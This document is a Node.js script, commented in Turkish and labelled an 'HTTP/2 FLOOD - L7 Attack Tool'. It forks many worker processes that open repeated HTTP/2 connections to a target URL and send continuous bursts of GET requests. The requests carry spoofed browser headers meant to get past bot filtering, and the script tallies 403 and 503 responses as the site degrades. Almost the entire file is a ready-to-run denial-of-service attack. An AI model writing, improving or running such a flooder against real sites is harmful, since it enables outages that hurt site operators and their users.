const http2 = require('http2');
const cluster = require('cluster');
const url = require('url');
const tls = require('tls');

// Komut satırı argümanlarını kontrol et
if (process.argv.length < 4) {
    console.log("Kullanım: node script.js <target> <thread> <time>");
    console.log("Örnek: node script.js https://example.com 8 100");
    process.exit(1);
}

const target = process.argv[2];
const threads = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

const parsed = url.parse(target);

// Sadece Firefox 147 ve 148 User-Agent'ları
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0"
];

// İstatistik değişkenleri
let stats = {
    '200': 0,
    '403': 0,
    '503': 0,
    'other': 0,
    'requests': 0,
    'startTime': Date.now()
};

if (cluster.isMaster) {
    console.clear();
    console.log('━'.repeat(60));
    console.log('╔════════════════════════════════════════════════════════╗');
    console.log('║           HTTP/2 FLOOD - L7 Attack Tool               ║');
    console.log('╚════════════════════════════════════════════════════════╝');
    console.log(`Target  : ${target}`);
    console.log(`Threads : ${threads}`);
    console.log(`Duration: ${duration}s`);
    console.log(`Mode    : Proxyless`);
    console.log('━'.repeat(60));
    
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }

    // İstatistikleri göster
    const statsInterval = setInterval(() => {
        const elapsed = ((Date.now() - stats.startTime) / 1000).toFixed(1);
        const rps = Math.floor(stats.requests / elapsed);
        
        process.stdout.write('\r\x1b[K');
        process.stdout.write(
            `[${elapsed}s] ` +
            `RPS: \x1b[32m${rps}\x1b[0m | ` +
            `Total: \x1b[36m${stats.requests}\x1b[0m | ` +
            `200: \x1b[32m${stats['200']}\x1b[0m | ` +
            `403: \x1b[33m${stats['403']}\x1b[0m | ` +
            `503: \x1b[31m${stats['503']}\x1b[0m | ` +
            `Other: ${stats['other']}`
        );
    }, 100);

    cluster.on('message', (worker, message) => {
        if (message.type === 'stats') {
            stats['200'] += message.data['200'] || 0;
            stats['403'] += message.data['403'] || 0;
            stats['503'] += message.data['503'] || 0;
            stats['other'] += message.data['other'] || 0;
            stats['requests'] += message.data['requests'] || 0;
        }
    });

    cluster.on('exit', (worker) => {
        // Worker kapandığında yeniden başlat
        if (Date.now() - stats.startTime < duration * 1000) {
            cluster.fork();
        }
    });

    setTimeout(() => {
        clearInterval(statsInterval);
        console.log('\n\n━'.repeat(60));
        console.log('Saldırı tamamlandı!');
        
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        
        setTimeout(() => process.exit(0), 1000);
    }, duration * 1000);

} else {
    let workerStats = {
        '200': 0,
        '403': 0,
        '503': 0,
        'other': 0,
        'requests': 0
    };

    process.on('uncaughtException', (e) => {});
    process.on('unhandledRejection', (e) => {});

    const attack = () => {
        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
        
        const client = http2.connect(target, {
            settings: {
                headerTableSize: 65536,
                enablePush: false,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                maxConcurrentStreams: 1000
            },
            rejectUnauthorized: false
        });

        client.on('error', (err) => {
            try {
                client.close();
            } catch(e) {}
        });

        const sendRequest = () => {
            try {
                if (client.destroyed || client.closed) return;

                const headers = {
                    ':method': 'GET',
                    ':path': '/',
                    ':scheme': 'https',
                    ':authority': parsed.host,
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'accept-language': 'en-US,en;q=0.5',
                    'accept-encoding': 'gzip, deflate, br',
                    'referer': 'https://www.google.com/',
                    'upgrade-insecure-requests': '1',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'cross-site',
                    'sec-fetch-user': '?1',
                    'te': 'trailers',
                    'cache-control': 'max-age=0'
                };

                const req = client.request(headers);
                
                workerStats['requests']++;

                req.on('response', (headers) => {
                    const status = headers[':status'];
                    if (status === 200) workerStats['200']++;
                    else if (status === 403) workerStats['403']++;
                    else if (status === 503) workerStats['503']++;
                    else workerStats['other']++;
                });

                req.on('error', () => {});
                req.on('data', () => {});
                req.end();
            } catch (e) {}
        };

        // Sürekli istek gönder
        const floodInterval = setInterval(() => {
            for (let i = 0; i < 32; i++) {
                sendRequest();
            }
        }, 10);

        setTimeout(() => {
            clearInterval(floodInterval);
            try {
                client.close();
            } catch(e) {}
        }, 8000);
    };

    // Her worker için saldırı başlat
    const startAttack = () => {
        attack();
        
        // Her 4 saniyede bir yeni bağlantı aç
        setInterval(() => {
            attack();
        }, 4000);
    };

    // 10 farklı bağlantı başlat
    for (let i = 0; i < 10; i++) {
        setTimeout(() => startAttack(), i * 200);
    }

    // İstatistikleri master'a gönder
    setInterval(() => {
        if (process.connected) {
            try {
                process.send({ type: 'stats', data: workerStats });
                workerStats = {
                    '200': 0,
                    '403': 0,
                    '503': 0,
                    'other': 0,
                    'requests': 0
                };
            } catch(e) {}
        }
    }, 500);
}